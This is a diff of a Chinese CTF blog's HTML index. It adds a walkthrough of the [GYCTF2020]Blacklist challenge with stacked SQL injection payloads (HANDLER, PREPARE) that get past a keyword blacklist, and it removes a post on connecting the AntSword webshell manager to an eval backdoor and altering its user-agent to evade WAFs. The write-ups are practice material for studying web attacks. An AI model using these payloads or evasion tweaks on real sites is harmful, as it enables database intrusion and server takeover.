@@ -169,6 +169,131 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-list" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/02/12/list/" class="article-date">
+  	<time datetime="2021-02-12T09:17:13.000Z" itemprop="datePublished">2021-02-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/12/list/">
+        23-buu练习[GYCTF2020]Blacklist
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2>知识点</h2>
+
+<p>一、堆叠注入<br>查表名、列名、字段名</p>
+<ol>
+<li>show databases;
+</li><li>show tables;
+</li><li>show columns from `table_name`;
+</li></ol>
+
+<p>二、本题使用HANDLER查看flag</p>
+<ol>
+<li>1';
+</li><li>handler FlagHere open;
+</li><li>handler FlagHere read first;
+</li><li>handler FlagHere close;#
+</li></ol>
+
+<p>三、HANDLER<br>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
+<ul>
+<li>HANDLER tbl_name OPEN [ [AS] alias]
+</li><li>HANDLER tbl_name READ index_name { = | <= |>= | < | > } (value1,value2,...)
+<li>    [ WHERE where_condition ] [LIMIT ... ]
+</li><li>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+</li><li>    [ WHERE where_condition ] [LIMIT ... ]
+</li><li>HANDLER tbl_name READ { FIRST | NEXT }
+</li><li>    [ WHERE where_condition ] [LIMIT ... ]
+</li><li>HANDLER tbl_name CLOSE 
+</li><li>//其中  HANDLER tbl_name OPEN AS example
+</li><li>//其后  HANDLER example READ index_name="example2"
+</li></=></li></ul>
+
+<p>四、预处理语句使用方法</p>
+<ol>
+<li>PREPARE name from '[my sql sequece]';   //预定义SQL语句
+</li><li>EXECUTE name;  //执行预定义SQL语句
+</li><li>(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
+</li></ol>
+<ol>
+<li>SET @tn = 'hahaha';  //存储表名
+</li><li>SET @sql = concat('select * from ', @tn);  //存储SQL语句
+</li><li>PREPARE name from @sql;   //预定义SQL语句
+</li><li>EXECUTE name;  //执行预定义SQL语句
+</li><li>(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
+</li></ol>
+
+<h2>题目</h2>
+
+<p>提交 1’ 报错确定存在sql注入<br>提交 1’# 返回正常<br>提交 1’select# 返回黑名单:<br><img src="/2021/02/12/list/q1.png"><br>禁用了select和where等关键字<br>采用堆叠注入<br>首先查询列数：</p>
+<ul>
+<li>1' order by 2#]
+</li></ul>
+
+<p>列数为2</p>
+<p>union等关键词被过滤 正常注入无法进行<br>考虑堆叠注入——使用分号结束上一个语句再叠加其他语句一起执行；</p>
+<ul>
+<li>1' and 1=2;show databases#
+</li><li>1' and 1=2;show tables#
+</li></ul>
+
+<p><img src="/2021/02/12/list/q2.png"><br>然后</p>
+<ul>
+<li>1' and 1=2;desc `FlagHere`#
+</li></ul>
+
+<p><img src="/2021/02/12/list/q3.png"><br>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭<br>payload如下：</p>
+<ul>
+<li>1';
+HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
+</li></ul>
+
+<p><img src="/2021/02/12/list/q4.png"><br>得到flag~~</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-baby-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -187,7 +312,7 @@
   
     <h1 itemprop="name">
       <a class="article-title" href="/2021/02/10/baby-1/">
-        21-buu练习[GXYCTF2019]BabySQli
+        22-buu练习[GXYCTF2019]BabySQli
         
       </a>
     </h1>
@@ -967,80 +1092,6 @@ highlight_file(__FILE__);
 </li></ul>
 
 <p><img src="/2021/01/29/cat/cat3.png"><br>得到flag~<br>是轻松的一天bujiu~</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-shell" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/28/shell/" class="article-date">
-  	<time datetime="2021-01-28T04:49:36.000Z" itemprop="datePublished">2021-01-28</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/28/shell/">
-        14-buu练习Knife
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这道题是一个简单的shell题，需要用到“中国蚁剑”</p>
-<p style="color:yellow">一、中国蚁剑的下载</p>
-
-<p>中国蚁剑下载地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a><br>我们下载的时候需要下载两个部分，一个是项目核心源码”antSword“，另一个是加载器;加载器则分为三个版本：Mac、Windows、Linux。<br><img src="/2021/01/28/shell/shell1.png"></p>
-<p style="color:yellow">二、中国蚁剑的安装</p>
-
-<p>我下载的是“AntSword-Loader-v4.0.3-win32-x64.zip”，安装步骤如下；<br><b style="color:red">1、</b>我们解压“AntSword-Loader-v4.0.3-win32-x64.zip”后，双击“AntSword.exe”；</p>
-<p>第一次安装项目需要先初始化，如果你已经下载了核心源码，就选择项目源码的文件夹。（如果只下载了加载器，选择一个空文件夹，加载器会自动帮你下载核心项目源码）。<br>这个项目文件夹就是你以后需要备份的，存储着你的shell和shell内的资料。<br><b>注意：</b>安装中国蚁剑时，选择工作目录后，会出现解压代码出错问题，这个问题是安装步骤不正确，我是新建了一个文件夹作为蚁剑的工作目录，才出现了这个问题，应该选择antSword-master.zip加压后的文件，这样才能正确的安装。<br><b style="color:red">2、</b>等初始化完成后，再双击“AntSword.exe”即可正常启动！</p>
-<p style="color:yellow">三、中国蚁剑的使用</p>
-
-<p><b style="color:red">1、</b>添加一个shell<br>首先：右键单击 - 添加数据；<br>其次：输入URL地址，连接密码以及编码设置。PHP语言推荐编辑器使用chr加密；<br>从次：还可以配置shell的请求信息和post内容；<br>最后：还可以配置全局代理；<br><b style="color:red">2、</b>关于编码器<br>编码器是这个程序的过人之处，用编码器加密可以轻松绕过WAF。<br><b style="color:red">3、</b>user-agent修改<br>要注意的是，软件默认的user-agent是：User-Agent: antSword/v2.0；而且大部分人都不会去自定义useragent，这就给waf和蜜罐白白送了一个特征，所以我们要修改一下源代码：<br>修改项目路径：<br>antSword\modules\request.js （修改const USER_AGENT = ‘antSword/v2.1’;这一行代码！）<br>antSword\modules\update.js （有两处要修改；可搜索“antSword/v2.0”来找到这两行代码！）</p>
-<h2>题目：</h2>
-
-<p>打开题目链接，界面如下：<br><img src="/2021/01/28/shell/shell2.png"><br>这是一个典型的后门程序</p>
-<ul>
-<li>//eval — 把字符串bai作为PHP代码执行 
-</li><li>eval('echo 123;');//输出123
-</li></ul>
-
-<p>有的字符串放入到eval当中，eval会把字符串解析为php代码来进行执行，那么结合$_POST[‘posha’]的话，只要使用post传输时在name为posha的值中写入任何字符串，都可以当做php代码来执行。<br>用蚁剑<br>复制URL<br>并填入密码<br><img src="/2021/01/28/shell/shell3.png"><br>添加<br>右键文件管理,在“/”目录下的最底层有个flag文件：<br><img src="/2021/01/28/shell/shell4.png"><br>点开后得到flag<br><img src="/2021/01/28/shell/shell5.png"></p>
 
       
     </div>
